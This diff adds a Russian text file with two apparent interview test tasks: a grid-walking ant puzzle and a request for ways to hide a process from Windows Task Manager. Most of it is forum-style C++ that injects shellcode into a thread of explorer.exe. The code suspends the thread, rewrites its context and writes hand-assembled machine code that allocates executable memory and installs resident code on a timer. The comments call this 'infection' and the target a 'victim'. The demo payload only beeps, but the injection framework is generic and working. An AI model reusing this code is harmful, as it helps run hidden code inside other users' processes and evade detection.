@@ -1,0 +1,234 @@
+Тестовое задание 1.
+
+На бесконечной координатной сетке находится муравей. Муравей может
+перемещатся на 1 клетку вверх (x,y+1), вниз (x,y-1), влево (x-1,y),
+вправо (x+1,y), по одной клетке за шаг.
+
+Клетки, в которых сумма цифр в координате X плюс сумма цифр в
+координате Y больше чем 25 недоступны
+муравью. Например, клетка с координатами (59, 79) недоступна, т.к.
+5+9+7+9=30, что больше 25.
+
+Сколько cклеток может посетить муравей если его начальная позиция
+(1000,1000), (включая начальную клетку).
+
+Прислать ответ в виде числа клеток и решение на языке C++
+--
+Второе тестовое задание.
+
+Стоит задача скрыть процесс с определеным именем в диспетчере процессов
+Windows
+Предложите метод(ы) решения с примером кода основного механизма.
+
+
+
+
+
+https://bugtraq.ru/library/programming/invisible.html
+
+
+
+
+
+
+Хех... :) Нашел написанную мной программу 8-летней давности, за
+работоспособность на новых ОС не отвечаю :)
+
+// Поправить ошибку - Присоединяться в тому Explorer-у, который принадлежит 
+активному пользователю.
+
+#include "stdafx.h"
+
+// Нужна эта функция.
+#pragma comment(lib,"ntdll.lib")
+struct A { int p,t; };
+extern "C" int __stdcall NtOpenThread(void*,int,void*,void*);
+
+//-----------------------------------------------------------------------------------------------
+// УРОВЕНЬ 1
+// Выполнение в любом потоке произвольного кода.
+// 1. Первые 4 байта должны быть нулевыми
+// 2. Точка входа с 4 байта
+// 3. Код должен заканчиваться командой "retn размер_кода-4"
+
+int infect(int p, int t, void* code, int code_size, int fix) {
+  int ready=0;
+
+  // Открываем процесс
+  HANDLE ph = OpenProcess(PROCESS_ALL_ACCESS,false,p);
+  if(ph) {
+   // Открываем поток
+    static char oa[24];
+    A a;
+   a.t = t;
+   a.p = p;
+   HANDLE hThread;
+   DWORD b=NtOpenThread(&hThread,MAXIMUM_ALLOWED,&oa,&a);
+    if(!b) {
+     // Усыпляем поток
+     b=SuspendThread(hThread);
+      if(b!=-1) {
+        // Сосотяние потока
+       CONTEXT cont;
+       cont.ContextFlags=CONTEXT_CONTROL;
+       b=GetThreadContext(hThread,&cont);
+        if(b) {
+          // Внедряем код
+          *(int*)(code) = cont.Eip;
+          *(int*)((char*)code+fix) += cont.Esp-code_size;
+          b=WriteProcessMemory(ph,(void*)(cont.Esp-code_size),code,code_size,&b);
+
+          if(b) {
+            // Устанавливаем новое состояние потока
+            cont.Eip=cont.Esp-code_size+4;
+            cont.Esp=cont.Esp-code_size;
+           ready = SetThreadContext(hThread,&cont);
+          }
+        }
+
+        // Возобновим выполнение
+       b=ResumeThread(hThread);
+        if(b==0xffffffff) FatalAppExit(1,"RESUME");
+      }
+
+     // Закроем дескриптор
+     CloseHandle(hThread);
+    }
+   // Закроем дескриптор
+   CloseHandle(ph);
+  }
+  return ready;
+}
+
+//-----------------------------------------------------------------------------------------------
+// УРОВЕНЬ 2
+// Внедрение резидентного кода
+// 1. Резидентный код не должен вызвать другие функции и иметь глобальных 
+переменные
+// 2. Резидентному коду передается указатель на область памяти, где он может 
+хранить
+//    статические переменные.
+// 3. Для вызова системных функций, эта в этой области памяти 
+инициализируется указатели.
+
+static char infect_code[81] =
+    "\x00\x00\x00\x00"     //  0 Прошлое значение EIP
+    "\x9C"                 //  4 pushf
+    "\x60"                 //  5 pusha
+    "\x68\x40\x00\x00\x00" //  6 push PAGE_EXECUTE_READWRITE
+    "\x68\x00\x10\x00\x00" // 11 push MEM_COMIT
+    "\x68\x00\x00\x00\x00" // 16 push sizeof resident_code+resident_data
+    "\x68\x00\x00\x00\x00" // 21 push 0
+    "\xB8\x00\x00\x00\x00" // 26 mov eax, <VIRTUAL_ALLOC>
+    "\xFF\xD0"             // 31 call eax
+    "\x8B\xF8"             // 33 mov edi, eax
+    "\xBE\x50\x00\x00\x00" // 35 mov esi, 80
+    "\xB9\x00\x00\x00\x00" // 40 mov ecx, sizeof resident_code+resident_data
+    "\xFC"                 // 45 cld
+    "\xF3\xA4"             // 46 rep movsb
+    "\x01\x40\x07\x90"     // 48 add [eax+7], eax <- Может некрасиво, зато 
+работает.
+    "\x50"                 // 52 push eax
+    "\x68\x00\x04\x00\x00" // 53 push 1000
+    "\x68\x00\x00\x00\x00" // 58 push 0
+    "\x68\x00\x00\x00\x00" // 63 push 0
+    "\xB8\x00\x00\x00\x00" // 68 mov eax, <SET_TIMER>
+    "\xFF\xD0"             // 73 call eax
+    "\x61"                 // 75 popa
+    "\x9D"                 // 76 popf
+    "\xC2\x00\x00";        // 77 retn <76+resident_code+resident_data>
+
+int resident(int p, int t, void* resident_code, int resident_code_size, 
+void* resident_data, int resident_data_size) {
+  // Необходимые функции (перекинуть в init)
+  void* fnAlloc = 
+GetProcAddress(GetModuleHandle("kernel32.dll"),"VirtualAlloc");
+  if(!fnAlloc) return 0;
+  void* fnSetTimer = GetProcAddress(LoadLibrary("user32.dll"),"SetTimer");
+  if(!fnSetTimer) return 0;
+
+  // Создание упаковки (оптимизировать для супер-заражения)
+  int code_size = 80+resident_code_size+resident_data_size;
+  char* code = new char[code_size];
+  memcpy(code, infect_code, 80);
+  memcpy(code+80, resident_code, resident_code_size);
+  memcpy(code+80+resident_code_size, resident_data, resident_data_size);
+
+  // Коррекция размеров (переписать, как заголовочный ASM-файл)
+  *(  int*)(code+17) = resident_code_size+resident_data_size;
+  *(  int*)(code+41) = resident_code_size+resident_data_size;
+  *(short*)(code+78) = code_size-4;
+  *(void**)(code+27) = fnAlloc;
+  *(void**)(code+69) = fnSetTimer;
+  *(  int*)(code+87) = resident_code_size;
+
+  // Внедряем
+  int r = infect(p,t,code,code_size,36);
+
+  delete code;
+
+  return r;
+}
+
+//-----------------------------------------------------------------------------------------------
+// Резидентный код
+
+struct ResidentData {
+  void(__stdcall*Beep)(int,int);
+};
+
+void __stdcall ResidentCode(int,int,int,int) {
+  ResidentData* d;
+   __asm mov d, 12345678h
+  d->Beep(100,10);
+}
+
+void ResidentCodeEnd() {
+  MessageBox(0,"A","B",0);
+}
+
+//-----------------------------------------------------------------------------------------------
+// Главная процедура
+
+void main() {
+  // Инициализация блока данных.
+  ResidentData d;
+  d.Beep = 
+(void(__stdcall*)(int,int))GetProcAddress(GetModuleHandle("kernel32.dll"),"Beep");
+  if(!d.Beep) FatalAppExit(1,"Can't find beep function");
+
+  // Поиск процесса жертвы
+  HANDLE s = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS,0);
+  PROCESSENTRY32 pr;
+  pr.dwSize = sizeof(PROCESSENTRY32);
+  int r = Process32First(s,&pr);
+  while(true) {
+    if(!r) FatalAppExit(1,"Can't open process");
+    if(0==strcmpi(pr.szExeFile, "explorer.exe")) break;
+    r = Process32Next(s,&pr);
+  }
+  CloseHandle(s);
+  int p=pr.th32ProcessID;
+
+  // Поиск потока жертвы
+  s = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD,0);
+  THREADENTRY32 th;
+  th.dwSize = sizeof(THREADENTRY32);
+  r = Thread32First(s,&th);
+  while(true) {
+    if(!r) FatalAppExit(1,"Can't open thread");
+    if(th.th32OwnerProcessID==p) break;
+    r = Thread32Next(s,&th);
+  }
+  CloseHandle(s);
+  int t = th.th32ThreadID;
+
+  // Заражение
+  r = resident(p, t, &ResidentCode, 
+int(&ResidentCodeEnd)-int(&ResidentCode), &d, sizeof(ResidentData));
+  if(!r) FatalAppExit(1,"Can't infect");
+}
+
+
+
+
